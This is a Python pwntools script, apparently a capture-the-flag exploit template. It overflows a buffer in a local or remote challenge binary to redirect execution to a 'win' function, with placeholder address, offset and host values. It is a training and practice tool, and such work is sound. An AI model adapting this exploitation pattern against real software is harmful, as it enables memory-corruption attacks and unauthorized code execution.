#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
rop = ROP(exe)
context.log_level = 'debug'
host = 'chall.server'
port = 1337

def start(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         ADDRESSES
# =========================================================
win = 0x1337

# =========================================================
#                         EXPLOITS
# =========================================================
io = start()

# Got manually through cyclic gdb-pwndbg
offset = 1337

# flattening  payload here
payload = flat({
    offset: [
        win
    ]
})

# sending payload
io.sendlineafter(b'>', payload)

io.interactive()